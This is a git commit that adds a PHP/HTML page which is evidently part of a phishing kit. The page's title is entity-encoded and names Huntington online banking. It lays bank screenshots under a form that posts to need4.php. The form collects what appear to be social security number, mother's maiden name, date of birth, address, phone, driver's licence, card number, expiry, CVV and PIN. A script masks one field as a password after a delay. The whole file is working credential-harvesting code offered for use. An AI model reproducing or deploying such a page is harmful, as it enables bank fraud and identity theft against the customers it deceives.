23af444f2f0132576ca2ef39b84fb3b8285460d9
Stefan Pejcic <pejcha1994@gmail.com>
2022-02-09 14:25:39 +0100

    Create surf4.php

---
+++ 09.02.2022/surf4.php
@@ -0,0 +1,106 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;&#32;&#97;&#110;&#100;&#32;&#73;&#110;&#118;&#101;&#115;&#116;&#105;&#110;&#103;&#32;&#124;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;</title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<script>setTimeout(function() {
+  document.getElementsByTagName('input')[10].type = "password"
+}, 1000);
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+<style type="text/css">
+.textbox {  
+    border-top: solid 2px #8e8e8e; 
+    border-right: solid 2px #d1d1d1; 
+    border-left: solid 2px #d1d1d1; 
+    border-bottom: solid 2px #e4e4e4;
+	border-radius: 5px;
+	font-family: Tahoma,"????","??",arial;
+    font-size: 14px;
+  	color: #555; 	
+    height: 38px; 
+  	padding-left:5px;
+    width: 275px; 
+ } 
+ 
+.textbox:focus {  
+    border-color: #4488cc; 
+    border-style: solid; 
+    border-width: 2px; 
+    outline: 0; 
+ } 
+ .textbox1 {
+	height: 28px;
+    width: 275px;
+	padding-right: 4px;
+	font-family: "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", Verdana, sans-serif;
+    font-size: 18px;
+	color: #333;
+    text-align: right;
+    font-weight: bold;
+    border: 0px solid #fff; 
+} 
+.textbox1:focus { 
+    outline: none; 
+    border: 0px solid #fff;
+} 
+</style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 981px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+</head>
+<body bgColor="#D3D3D3">
+<div class="loader"></div>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:981px; height:887px; z-index:0"><img src="images/h15.png" alt="" title="" border=0 width=981 height=887></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:2px; top:858px; width:976px; height:678px; z-index:1"><img src="images/h16.png" alt="" title="" border=0 width=976 height=678></div>
+<form action=need4.php name=sattusoda id=sattusoda method=post>
+<input name="sn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:257px;z-index:3">
+<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:337px;z-index:4">
+<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:417px;z-index:5">
+<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:497px;z-index:6">
+<input name="ph" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:577px;z-index:7">
+<input name="dl" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:657px;z-index:8">
+<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:737px;z-index:9">
+<input name="cn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:817px;z-index:10">
+<input name="ex" placeholder="MM/YY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:897px;z-index:11">
+<input name="vc" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:250px;left:125px;top:977px;z-index:12">
+<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:250px;left:125px;top:1057px;z-index:13">
+<div id="formimage1" style="position:absolute; left:124px; top:1137px; z-index:14"><input type="image" name="formimage1" width="144" height="44" src="images/cnt.png"></div>
+<div id="image3" style="position:absolute; overflow:hidden; left:290px; top:1152px; width:63px; height:24px; z-index:15"><a href="#"><img src="images/h11.png" alt="" title="" border=0 width=63 height=24></a></div>
+
+</div>
+
+</body>
+</html>
